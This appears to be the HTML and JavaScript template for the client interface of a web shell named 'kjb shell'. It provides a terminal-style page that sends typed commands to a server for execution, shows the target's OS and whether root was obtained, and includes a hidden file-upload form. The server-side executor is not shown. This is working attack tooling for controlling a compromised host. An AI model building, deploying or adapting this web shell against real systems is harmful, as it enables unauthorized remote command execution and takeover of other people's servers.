<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
    <title>kjb shell</title>
    <style>
        /* {base.css} */

        #targetInfo {
            display: flex;
            position: absolute;
            top: 0;
            right: 0;
            flex-flow: column;
            width: fit-content;
            height: fit-content;
            margin: 0.25em 0.25em;
            text-align: right;
            background-color: transparent;
            pointer-events: none;
            max-width: 33% !important;
        }

        .indicator {
            background-color: #657b83 !important;
        }

        .reqName {
        }

        .reqPercent {
        }

        .indicator * {
            background-color: #657b83 !important;
            padding: 0 !important;
            margin: 0 !important;
        }


        #targetInfo * {
            pointer-events: none;
            display: flex;
            padding: 0.25em 0.5em;
            flex-shrink: 1;
            align-self: end;
            margin-bottom: 0.25em;
        }

        #shell {
            display: flex;
            flex-flow: column;
            position: relative;
            height: 100%;
            width: 100%;
        }

        #bufferWrapper {
            overflow: scroll;
            overflow-x: hidden;
            flex: 1 1 auto;
        }

        .logError {
            color: var(--err-fg);
        }


        #inputWrapper {
            padding: 0.25em;
            height: 1.75em;
            display: flex;
            flex-flow: row;
            background-color: transparent;
            z-index: 1000;
        }

        #inputCwd {
            flex: fit-content;
            background-color: var(--hint-bg);
            color: var(--bg);
        }

        #inputCurrHost {
            flex: fit-content;
            background-color: var(--bg-dark);
            color: var(--hint-bg);
        }

        .logSpace {
            height: 1em;
        }

        #inputWrapper * {
            padding: 0.25em 0.5em;
        }

        .logCommand {
            color: var(--cmd);
            font-weight: bold;
        }

        .targetInfoOs {
            background-color: #6c71c4 !important;
        }

        .targetInfoSuperUser {
            background-color: #dc322f !important;
        }

        #input {
            border: none;
            caret-shape: block !important;
            flex: 1 1 auto;
            padding: 0 !important;;
            margin-left: 0.5em;
        }

        .inputElement {
        }

        .logElement {
        }

        .hidden {
            display: none;
        }

        #wrapper {
            padding: 0.1em;
        }

    </style>
</head>
<body>
<div class="hidden">
    <form method="post" enctype="multipart/form-data">
        <input id="fileUpload" type="file" name="file"/>
    </form>
</div>
<div id="wrapper">
    <div id="shell">
        <div id="targetInfo">
            <div class="targetInfoOs targetInfoEl">...</div>
            <div class="targetInfoSuperUser targetInfoEl">...</div>
            <div style="margin: 0.25em; background-color: transparent;"></div>
        </div>
        <div id="bufferWrapper">
            <ul id="buffer">

            </ul>
        </div>
        <div id="inputWrapper">
            <div id="inputCurrHost" class="inputElement"></div>
            <div id="inputCwd" class="inputElement"></div>
            <input type="text" autofocus id="input">
        </div>
    </div>
</div>
<script>
    /* {kjbquery.js} */
    /* {api.js} */
    /* {logging.js} */
    /* {commands.js} */

    const buffer = $("#buffer");
    const shell = $("#shell");
    const input = $("#input");
    const bufferWrapper = $("#bufferWrapper");

    let currInfo = {};

    const setInputHint = (hint) => {
        $("#inputCwd").setText(`${hint}`);
    };

    const setInputCurrHost = (currHost) => {
        $("#inputCurrHost").setText(`${currHost}`);
    };

    const updateInfo = (info) => {
        currInfo = info;
        let username = info.username;
        if (username.indexOf("\\") !== -1) {
            username = username.slice(username.indexOf("\\") + 1);
        }
        setInputCurrHost(`${username}@${info.hostname}`);
        $(".targetInfoOs").setText(info.all);
        $(".targetInfoSuperUser").setText(info.isSuperUser ? "you have root!" : "you don't have root")
    };

    const init = () => {
        onCwdUpdated = (cwd) => {
            setInputHint(cwd);
        };

        input.on("keydown", ev => {
            handleInputKeyEvent(ev.keyCode);
        });

        loadInfo();
    };

    const loadInfo = () => {
        log("Sending initial request, please wait...");
        requestInfo((data) => {
            clearLog();
            updateInfo(data);
            colorize(log("Welcome to kjb shell!"), "#268bd2");
            logSpace();
            printCommands();
            logSpace();
        }, handleError(err => {
            logError("Don't know how to proceed.");
        }));
    };

    const handleInputKeyEvent = (kc) => {
        if (kc === 13) {
            if (input.getVal() === "") {
                return;
            }
            submit(input.getVal());
            input.setVal("");
        }
    };

    const submit = (cmd) => {
        cmd = cmd.trim();
        logSpace();
        const msg = logCommand("kjb# " + cmd);

        if (handleInternally(cmd)) {
            return;
        }

        msg.setText(cwd + "# " + cmd);

        requestExec(cmd, (data) => {
            data.output.forEach(line => log(line));
        }, handleError(err => {
            const {errmsg} = err;
            if (isKjbErr(errmsg)) {
                logError("No response received.");
            }
        }))
    };

    const isKjbErr = (msg) => {
        return msg.indexOf("KJB") !== -1;
    };

    const handleError = (then) => {
        return (status, err) => {
            const {errmsg} = err;
            if (!isKjbErr(errmsg)) {
                logError("An error has happened: " + errmsg);
                logError("Response: " + JSON.stringify(err));
            }
            if (then) {
                then(err);
            }
        }
    };

    init();
</script>
</body>
</html>
